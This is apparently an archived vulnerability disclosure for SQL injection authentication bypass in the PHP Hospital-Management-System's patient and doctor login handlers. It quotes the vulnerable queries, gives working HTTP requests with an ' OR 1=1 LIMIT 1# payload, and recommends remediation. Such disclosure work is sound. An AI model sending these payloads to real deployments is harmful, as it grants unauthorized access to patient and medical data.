# Hospital-Management-System SQL Injection Authentication Bypass (vanilla PHP + MySQLi)

> ⚠️ **COVERED / 勿提交**: 提报前查重发现在先披露——**GitHub issue #71 (2026-06-18: 登录SQLi认证绕过 Patient+Doctor — 与本洞一致)**。本目录仅作研究存档,不提交 VulDB。
**CWE-89 · Unauthenticated SQL injection (login handlers) · full patient and doctor authentication bypass**

> **Vendor:** kishan0725
> **Product:** Hospital-Management-System (vanilla PHP + MySQLi)
> **Affected version:** master branch, commit 777fda46b77a820977a5ba616283dbfbc40bf7e1 (last commit 2024-10-07; no official release version)
> **Affected endpoints:** POST /func.php (patient login, `patsub=1`); POST /func1.php (doctor login, `docsub1=1`)
> **Dedup status:** CLEAN — reviewed against the 12 CVEs already assigned to this project; none covers the login handlers or an authentication-bypass root cause.
> **Disclosed via:** VulDB (submission #xxxxxx)
> **Note:** Sensitive extracted values (credentials) have been redacted from this public disclosure.

## 1. Summary

Both login handlers of Hospital-Management-System concatenate unfiltered `$_POST` input into SQL `SELECT` statements. An unauthenticated attacker can log in as an arbitrary existing account (in practice the first `patreg` / `doctb` row) using a ` OR 1=1 LIMIT 1#` tautology in the identifier field, receiving a fully authenticated session without any credential. Patient sessions expose bookings, prescriptions and billing; doctor sessions expose appointments and patient data.

## 2. Root Cause

| File | Lines | Statement |
|---|---|---|
| `func.php` | 8-10 | patient login query (below) |
| `func1.php` | 7-9 | doctor login query (below) |

```php
// func.php:8-10 (patient login, POST patsub=1)
$email = $_POST['email'];
$password = $_POST['password2'];
$query = "select * from patreg where email='$email' and password='$password';";
// -> mysqli_query(...); mysqli_num_rows(...)==1 gate; $_SESSION['pid'/'username'/'email'] set; 302 -> admin-panel.php

// func1.php:7-9 (doctor login, POST docsub1=1)
$dname = $_POST['username3'];
$dpass = $_POST['password3'];
$query = "select * from doctb where username='$dname' and password='$dpass';";
// -> same pattern; $_SESSION['dname'] set; 302 -> doctor-panel.php
```

Raw string concatenation, no escaping, no prepared statements, no rate limiting. The shipped schema (`myhmsdb.sql`) stores plaintext passwords.

## 3. Prerequisites

None. Both handlers are directly reachable by POST (flat file layout); no session, CSRF token or rate limit is involved. Network access to the application is the only requirement.

## 4. Reproduction

```http
POST /func.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

patsub=1&email=%27+OR+1%3D1+LIMIT+1%23&password2=x
```

Decoded: `email=' OR 1=1 LIMIT 1#`. `LIMIT 1` guarantees exactly one row, satisfying the `mysqli_num_rows()==1` login gate.

Response: `HTTP 302`, `Location: admin-panel.php`, `Set-Cookie: PHPSESSID=...`.
`GET /admin-panel.php` with that cookie renders the authenticated patient dashboard of the first `patreg` row (pid=1).

Doctor variant:

```http
POST /func1.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

docsub1=1&username3=%27+OR+1%3D1+LIMIT+1%23&password3=x
```

Response: `HTTP 302` to `doctor-panel.php`; the cookie renders the authenticated doctor dashboard.

Baseline: the same POSTs with a nonexistent account return the invalid-credentials alert.

Runnable PoC: `poc/poc.sh`.

## 5. Confirmed Techniques

- Manual verification on a local instance: MySQL 8.0.39 (127.0.0.1:3307), PHP 8.4.26 built-in server, `display_errors=0`, seeded `myhmsdb.sql`.
- Patient bypass: 302 + session cookie; dashboard rendered "Welcome <REDACTED>" (first `patreg` row, pid=1).
- Doctor bypass: 302 + session cookie; doctor dashboard rendered with seed doctor data.
- Baseline invalid credentials: HTTP 200 with alert, no session.

## 6. Impact

Complete authentication bypass for both roles. An attacker gains full patient and doctor privileges: reading bookings, prescriptions, billing and patient data, and acting as the account (e.g. booking appointments). The session also enables chained flaws — notably the appointment-booking INSERT sink, which only evaluates with a patient session. Extracted credential values are withheld: `<REDACTED>` (verified locally against a throwaway DB).

## 7. CVSS 3.1

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` (Base 9.1, Critical)

## 8. Remediation

- Use prepared statements with bound parameters for both login queries.
- Store only `password_hash()` digests and verify with `password_verify()`; migrate the plaintext columns.
- Add rate limiting / account lockout on both handlers.

## 9. References

- Project: https://github.com/kishan0725/Hospital-Management-System
- Commit: 777fda46b77a820977a5ba616283dbfbc40bf7e1 (master, 2024-10-07)
- CWE-89: https://cwe.mitre.org/data/definitions/89.html

> 🗑️ External disclosure gist 已下线(2026-09-29): 在先披露密集(issue #71/#64/#49 等),本洞不提交 VulDB。
- VulDB submission #xxxxxx
- Local verification record: `evidence/HMS-04.txt`, `evidence/HMS-05.txt`; PoC: `poc/poc.sh`

---
*All validation was performed in a local, isolated environment. The temporary environment was destroyed after testing.*
